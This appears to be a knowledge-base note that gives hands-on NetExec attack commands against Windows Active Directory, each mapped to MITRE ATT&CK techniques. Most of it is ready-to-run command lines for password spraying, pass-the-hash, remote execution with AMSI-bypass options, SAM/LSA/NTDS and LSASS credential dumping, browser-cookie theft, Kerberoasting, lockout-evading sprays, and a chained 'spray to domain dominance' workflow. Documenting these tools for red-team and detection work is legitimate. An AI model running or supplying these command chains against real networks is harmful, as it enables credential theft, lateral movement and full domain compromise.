# NetExec — Hands-On Use Cases

Every command below is a direct application of a flag verified in `01 - Overview.md` against the live `nxc/cli.py`/`proto_args.py` source. Commands assume the `nxc` entry point (the modern name — `cme` still appears in older write-ups referring to CrackMapExec, the direct ancestor documented in `01`'s History section).

## Contents
- [Fleet-Wide Password Spraying — Full Matrix](#fleet-wide-password-spraying--full-matrix)
- [Credential Stuffing — Paired 1:1 List](#credential-stuffing--paired-11-list)
- [Pass-the-Hash Validation](#pass-the-hash-validation)
- [Pass-the-Ticket / Kerberos Cache Authentication](#pass-the-ticket--kerberos-cache-authentication)
- [Local vs. Domain Authentication](#local-vs-domain-authentication)
- [Credential-Validation-Only Sweep (No Execution)](#credential-validation-only-sweep-no-execution)
- [Command Execution Across the Four Exec Methods](#command-execution-across-the-four-exec-methods)
- [SAM and LSA Secret Dumping at Scale](#sam-and-lsa-secret-dumping-at-scale)
- [NTDS.dit Extraction from a Domain Controller](#ntdsdit-extraction-from-a-domain-controller)
- [DPAPI Secret and Browser Credential Harvesting](#dpapi-secret-and-browser-credential-harvesting)
- [LDAP Kerberoasting, AS-REP Roasting, and Targeted Kerberoasting](#ldap-kerberoasting-as-rep-roasting-and-targeted-kerberoasting)
- [Native BloodHound CE Collection](#native-bloodhound-ce-collection)
- [Share Enumeration, Spidering, and Bulk File Transfer](#share-enumeration-spidering-and-bulk-file-transfer)
- [Module-Driven Credential Harvesting](#module-driven-credential-harvesting)
- [Module-Driven Vulnerability Screening](#module-driven-vulnerability-screening)
- [Cross-Protocol Validation Beyond SMB](#cross-protocol-validation-beyond-smb)
- [Generating an NTLM-Relay Target List](#generating-an-ntlm-relay-target-list)
- [Unauthenticated Recon — Timeroasting](#unauthenticated-recon--timeroasting)
- [Evasion/OPSEC Variant — Throttled, Lockout-Safe Spray](#evasionopsec-variant--throttled-lockout-safe-spray)
- [Chained Workflow — Spray to Domain Dominance](#chained-workflow--spray-to-domain-dominance)

---

## Fleet-Wide Password Spraying — Full Matrix

**MITRE ATT&CK:** [T1110.003](https://attack.mitre.org/techniques/T1110/003/) (Brute Force: Password Spraying)

```bash
nxc smb targets.txt -u users.txt -p passwords.txt
```

This is NetExec's **default** behavior when both `-u` and `-p` point at files: it tries **every username against every password** (a full cartesian spray), one authentication attempt per pairing per target, across all 256 default threads. This is the single highest-lockout-risk invocation in this note — see the evasion variant below for the fail-limit/jitter controls that make it operationally safer.

## Credential Stuffing — Paired 1:1 List

**MITRE ATT&CK:** [T1110.004](https://attack.mitre.org/techniques/T1110/004/) (Brute Force: Credential Stuffing)

```bash
nxc smb targets.txt -u users.txt -p passwords.txt --no-bruteforce
```

`--no-bruteforce` switches the matrix off — `users.txt` line 1 is paired only with `passwords.txt` line 1, line 2 with line 2, and so on. This is the shape used when the operator already has a list of *known-paired* credentials (e.g. from a breach dump or a previous harvesting pass) rather than an unrelated username list and an unrelated password guess list.

## Pass-the-Hash Validation

**MITRE ATT&CK:** [T1550.002](https://attack.mitre.org/techniques/T1550/002/) (Use Alternate Authentication Material: Pass the Hash)

```bash
nxc smb targets.txt -u administrator -H aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bda830b7586c
```

`-H` accepts a full `LM:NT` pair or an NT-hash-only string, and — like `-u`/`-p` — also accepts a **file** of hashes for a hash-spray across a target list. No plaintext password is ever needed or transmitted.

## Pass-the-Ticket / Kerberos Cache Authentication

**MITRE ATT&CK:** [T1550.003](https://attack.mitre.org/techniques/T1550/003/) (Use Alternate Authentication Material: Pass the Ticket)

```bash
export KRB5CCNAME=/tmp/administrator.ccache
nxc smb dc01.corp.local --use-kcache
```

`--use-kcache` authenticates from an existing Kerberos ticket cache (`KRB5CCNAME`) instead of a password or hash — the same ticket a Golden/Silver/Diamond forge from `Mimikatz/kerberos (Golden-Silver Ticket)/` or `Impacket/ticketer/` would produce. `--aesKey` is the equivalent path when an operator holds a cracked/extracted AES key instead of a live ticket file.

## Local vs. Domain Authentication

**MITRE ATT&CK:** [T1078.003](https://attack.mitre.org/techniques/T1078/003/) (Valid Accounts: Local Accounts)

```bash
# Domain auth (default when -d is given)
nxc smb targets.txt -u jsmith -p 'Summer2026!' -d corp.local

# Local-SAM auth against every target's own local Administrator
nxc smb targets.txt -u Administrator -p 'LocalAdminPW!' --local-auth
```

`--local-auth` is mutually exclusive with `-d` in the source — the tool authenticates against each target's **own local SAM**, not a domain controller, which matters when the same local-admin credential has been reused across a fleet (a common finding this tool exists specifically to surface).

## Credential-Validation-Only Sweep (No Execution)

**MITRE ATT&CK:** [T1087.002](https://attack.mitre.org/techniques/T1087/002/) (Account Discovery: Domain Account), [T1069.001](https://attack.mitre.org/techniques/T1069/001/) (Permission Groups Discovery: Local Groups)

```bash
nxc smb 10.10.0.0/16 -u svc_backup -p 'BackupSvc2025!'
```

No `-x`/`-X`/`-M` at all — this is the **auth-only** invocation from `01`'s connection-loop diagram. The console output shows OS/hostname/domain/signing status for every reachable host, and tags every host where the credential authenticated **and** the `\svcctl` admin check succeeded with `(Pwn3d!)`. This single command is how an operator (or an auditor) builds a "where does this one compromised credential actually have local-admin reach" map across an entire subnet in one pass.

## Command Execution Across the Four Exec Methods

**MITRE ATT&CK:** [T1047](https://attack.mitre.org/techniques/T1047/) (Windows Management Instrumentation), [T1569.002](https://attack.mitre.org/techniques/T1569/002/) (System Services: Service Execution), [T1053.005](https://attack.mitre.org/techniques/T1053/005/) (Scheduled Task/Job: Scheduled Task)

```bash
# Default -- WMI (Impacket/wmiexec/ mechanics)
nxc smb target -u admin -p pw -x "whoami /all"

# Service-based (Impacket/smbexec/ mechanics)
nxc smb target -u admin -p pw -x "whoami /all" --exec-method smbexec

# Scheduled-task based (cross-link LOLBins/schtasks/ for the target-side event set)
nxc smb target -u admin -p pw -x "whoami /all" --exec-method atexec

# DCOM MMC-object based -- no service or scheduled task ever touches disk
nxc smb target -u admin -p pw -X 'Get-Process' --exec-method mmcexec
```

`-x` runs a raw `cmd.exe` command; `-X` wraps and (by default) base64-encodes a PowerShell command, with `--obfs`/`--amsi-bypass`/`--force-ps32`/`--no-encode` as delivery-evasion knobs. Each `--exec-method` produces a **different, already-documented artifact signature** on the target — see `04 - Target Evidence.md`'s comparison table rather than treating "NetExec ran a command" as one evidentiary shape.

## SAM and LSA Secret Dumping at Scale

**MITRE ATT&CK:** [T1003.002](https://attack.mitre.org/techniques/T1003/002/) (OS Credential Dumping: Security Account Manager), [T1003.004](https://attack.mitre.org/techniques/T1003/004/) (OS Credential Dumping: LSA Secrets)

```bash
# Remote Registry method (regdump, default) across a whole subnet
nxc smb 10.10.0.0/16 -u admin -p pw --sam
nxc smb 10.10.0.0/16 -u admin -p pw --lsa

# secretsdump-style method instead
nxc smb target -u admin -p pw --sam secdump --lsa secdump
```

Run fleet-wide with a single validated local-admin credential, this turns "one reused local-admin password" into a bulk local-account-hash harvest across every host it's valid on in one command — no per-host manual `Impacket/secretsdump/` invocation needed. Output lands per-host under `~/.nxc/logs/sam/` and `~/.nxc/logs/lsa/` (see `03 - Source Evidence.md`).

## NTDS.dit Extraction from a Domain Controller

**MITRE ATT&CK:** [T1003.003](https://attack.mitre.org/techniques/T1003/003/) (OS Credential Dumping: NTDS)

```bash
# DRSUAPI/DCSync-style (default) -- requires replication rights, no VSS footprint on the DC
nxc smb dc01.corp.local -u admin -p pw --ntds

# VSS method instead -- creates and mounts a shadow copy on the DC
nxc smb dc01.corp.local -u admin -p pw --ntds vss

# Scope to a single account and pull Kerberos AES/DES keys too
nxc smb dc01.corp.local -u admin -p pw --ntds --user krbtgt --kerberos-keys
```

The default `drsuapi` method and its Event 4662/replication-right requirements are the same mechanics as `Impacket/secretsdump/`'s `-just-dc` and `Mimikatz/lsadump (DCSync)/` — cross-linked rather than re-derived here. The `vss` method instead leaves the shadow-copy-creation footprint documented in `LOLBins/ntdsutil/`.

## DPAPI Secret and Browser Credential Harvesting

**MITRE ATT&CK:** [T1555](https://attack.mitre.org/techniques/T1555/) (Credentials from Password Stores), [T1539](https://attack.mitre.org/techniques/T1539/) (Steal Web Session Cookie)

```bash
nxc smb targets.txt -u admin -p pw --dpapi
nxc smb targets.txt -u admin -p pw --dpapi cookies
```

Decrypts DPAPI-protected secrets (Credential Manager entries, Wi-Fi keys, saved browser logins) using the domain backup key or harvested local masterkeys; `cookies` additionally pulls and decrypts saved browser session cookies — a direct session-hijacking primitive against every host it's run on.

## LDAP Kerberoasting, AS-REP Roasting, and Targeted Kerberoasting

**MITRE ATT&CK:** [T1558.003](https://attack.mitre.org/techniques/T1558/003/) (Kerberoasting), [T1558.004](https://attack.mitre.org/techniques/T1558/004/) (AS-REP Roasting)

```bash
# Every SPN-bearing account in the domain
nxc ldap dc01.corp.local -u jsmith -p pw --kerberoasting kerb_hashes.txt

# Scope to specific accounts
nxc ldap dc01.corp.local -u jsmith -p pw --kerberoasting kerb_hashes.txt --kerberoast-account svc_sql svc_web

# AS-REP roast every account without Kerberos pre-auth
nxc ldap dc01.corp.local -u jsmith -p pw --asreproast asrep_hashes.txt

# Targeted Kerberoasting -- write a temp SPN, roast, remove it
nxc ldap dc01.corp.local -u jsmith -p pw --targeted-kerberoast helpdesk_svc
```

Full cracking-mode and encryption-type mechanics (RC4 vs. AES etype selection, hashcat modes 13100/19600/19700) are already documented in `Impacket/GetUserSPNs (Kerberoasting)/` and `Hashcat/` — this page only covers the NetExec-specific invocation. `--targeted-kerberoast` is the same "write an SPN onto an otherwise-non-roastable account, roast it, clean up" primitive documented for `LOLBins/setspn/`'s `-S` write capability — it requires `GenericWrite`/`GenericAll`/"Validated write to servicePrincipalName" over the target account, not just an authenticated session.

## Native BloodHound CE Collection

**MITRE ATT&CK:** [T1087.002](https://attack.mitre.org/techniques/T1087/002/) (Account Discovery: Domain Account), [T1482](https://attack.mitre.org/techniques/T1482/) (Domain Trust Discovery)

```bash
nxc ldap dc01.corp.local -u jsmith -p pw --bloodhound -c All
```

Runs the same LDAP-based collection BloodHound's own `SharpHound/` collector performs, without dropping SharpHound.exe on a Windows host at all. `-c/--collection` accepts the same method names documented in `BloodHound/SharpHound/01 - Overview.md` (Default, Group, LocalAdmin, Session, Trusts, DCOnly, ACL, ADCS, All, etc.) — cross-link there for what each collection method actually queries and the resulting edge types.

## Share Enumeration, Spidering, and Bulk File Transfer

**MITRE ATT&CK:** [T1135](https://attack.mitre.org/techniques/T1135/) (Network Share Discovery), [T1039](https://attack.mitre.org/techniques/T1039/) (Data from Network Shared Drive)

```bash
# What can this credential read/write, across every share on every host?
nxc smb targets.txt -u jsmith -p pw --shares

# Recursively search every readable share for interesting filenames/content
nxc smb targets.txt -u jsmith -p pw --spider C$ --pattern password secret .kdbx --content

# Pull a specific file back
nxc smb target -u jsmith -p pw --get-file '\Users\Public\notes.txt' notes.txt
```

`--shares` alone (with `--filter-shares WRITE`) is a fast way to find writable shares fleet-wide — a direct precursor to `LOLBins/winrar/`-style staging or a GPO-abuse write primitive.

## Module-Driven Credential Harvesting

**MITRE ATT&CK:** [T1003.001](https://attack.mitre.org/techniques/T1003/001/) (LSASS Memory), [T1552.006](https://attack.mitre.org/techniques/T1552/006/) (Group Policy Preferences)

```bash
# Parsed LSASS credentials without a raw minidump ever touching the operator's disk in plaintext
nxc smb targets.txt -u admin -p pw -M lsassy

# Stealthier LSASS dump via indirect syscalls (AV/EDR-evasion-focused)
nxc smb targets.txt -u admin -p pw -M nanodump

# Legacy SYSVOL GPP cpassword recovery
nxc smb dc01.corp.local -u jsmith -p pw -M gpp_password
```

`lsassy` and `nanodump` are two different design points on the same "get LSASS material without a naive full minidump" spectrum — `nanodump`'s indirect-syscall approach is the more AV/EDR-resistant of the two. `gpp_password` targets the same long-standing SYSVOL cpassword weakness Microsoft's MS14-025 patch stopped Group Policy from *creating* but never retroactively removed from already-deployed policies.

## Module-Driven Vulnerability Screening

**MITRE ATT&CK:** [T1210](https://attack.mitre.org/techniques/T1210/) (Exploitation of Remote Services)

```bash
nxc smb targets.txt -u '' -p '' -M zerologon
nxc smb targets.txt -u '' -p '' -M nopac
nxc smb targets.txt -u '' -p '' -M printnightmare
```

Several of these (`zerologon`, `smbghost`) run as **unauthenticated checks** — empty `-u -p` is intentional here, since the whole point is confirming whether a target is vulnerable *before* any credential is available. Cross-link `Impacket/ntlmrelayx/`'s `-t dcsync://` finding (this repo's own verified Zerologon exploit chain) for what a positive `zerologon` hit is actually worth to an operator.

## Cross-Protocol Validation Beyond SMB

**MITRE ATT&CK:** [T1021.006](https://attack.mitre.org/techniques/T1021/006/) (Remote Services: Windows Remote Management), [T1021.004](https://attack.mitre.org/techniques/T1021/004/) (Remote Services: SSH), [T1021.001](https://attack.mitre.org/techniques/T1021/001/) (Remote Services: RDP)

```bash
nxc winrm targets.txt -u jsmith -p pw -x "hostname"
nxc mssql targets.txt -u sa -p pw -q "SELECT name FROM sys.databases"
nxc ssh targets.txt -u root -p pw -x "id"
nxc rdp targets.txt -u jsmith -p pw --screenshot
nxc vnc targets.txt -p pw
```

The same credential-matrix/thread-pool engine documented in `01` drives every one of these — an operator validating "does this credential also work over WinRM/MSSQL/SSH/RDP/VNC" is running the identical loop, just against a different `proto_args.py` module. `nxc rdp --screenshot` is worth calling out specifically: a successful screenshot against a host with NLA disabled requires no valid credential at all (`--nla-screenshot`).

## Generating an NTLM-Relay Target List

**MITRE ATT&CK:** [T1557.001](https://attack.mitre.org/techniques/T1557/001/) (Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay)

```bash
nxc smb 10.10.0.0/16 -u '' -p '' --gen-relay-list relay_targets.txt
```

Runs unauthenticated across a range and writes every host that does **not** enforce SMB signing to a file — a direct, ready-made target list for `Impacket/ntlmrelayx/`. This is the concrete link between this tool's recon phase and that tool's exploitation phase, and a textbook Responder-to-relay chain when combined with `Responder/`.

## Unauthenticated Recon — Timeroasting

**MITRE ATT&CK:** [T1558](https://attack.mitre.org/techniques/T1558/) (Steal or Forge Kerberos Tickets)

```bash
nxc smb dc01.corp.local -u '' -p '' -M timeroast
```

No credential of any kind is required. `timeroast` exploits Windows' NTP authentication extension (MS-SNTP) to request password-hash material for **any computer or trust account** in the domain — a 2024 technique (SecuraBV research) that NetExec's maintainers added quickly, and a real example of this tool's module system tracking new offensive research rather than staying frozen at CrackMapExec-era functionality.

## Evasion/OPSEC Variant — Throttled, Lockout-Safe Spray

**MITRE ATT&CK:** [T1110.003](https://attack.mitre.org/techniques/T1110/003/) (Brute Force: Password Spraying)

```bash
nxc smb targets.txt -u users.txt -p 'Winter2026!' \
  --no-bruteforce --jitter 5-15 --ufail-limit 1 --continue-on-success \
  --no-admin-check
```

A single password against many usernames (the classic "one password, many accounts" spray shape that avoids per-account lockout thresholds), `--jitter 5-15` randomizing the delay between attempts, `--ufail-limit 1` stopping further attempts against any one account after its first failure (defense against tripping a lockout policy), `--continue-on-success` so the sweep doesn't stop at the first hit, and `--no-admin-check` to skip the `\svcctl` probe from `01`'s red-flag callout — removing one (but not all — see `05`) of the fixed behavioral fingerprints.

## Chained Workflow — Spray to Domain Dominance

**MITRE ATT&CK:** [T1110.003](https://attack.mitre.org/techniques/T1110/003/) → [T1003.003](https://attack.mitre.org/techniques/T1003/003/) → [T1558.003](https://attack.mitre.org/techniques/T1558/003/)

```bash
# 1. Spray for a valid credential
nxc smb targets.txt -u users.txt -p 'Winter2026!' --no-bruteforce --continue-on-success

# 2. Sweep for local-admin reach with whatever validated -- use -id to reuse the stored cred
nxc smb 10.10.0.0/16 -id 1

# 3. On any host where (Pwn3d!) appeared, harvest LSASS
nxc smb <pwn3d-host> -id 1 -M lsassy

# 4. If a domain-admin-equivalent hash/cred surfaced in step 3, go straight for the DIT
nxc smb dc01.corp.local -u Administrator -H <recovered-hash> --ntds

# 5. Alternatively, kerberoast every SPN account with the validated low-priv credential from step 1
nxc ldap dc01.corp.local -id 1 --kerberoasting kerb_hashes.txt
```

This is the realistic end-to-end shape most CISA #StopRansomware advisories describe when NetExec/CrackMapExec appears in an intrusion timeline: one spray hit feeds a fleet-wide admin-reach sweep, which feeds targeted credential harvesting, which feeds either direct NTDS extraction or a Kerberoasting pass — the `-id` flag (reusing a stored credential by database ID) is what makes chaining these steps a one-liner each rather than retyping credentials at every stage.
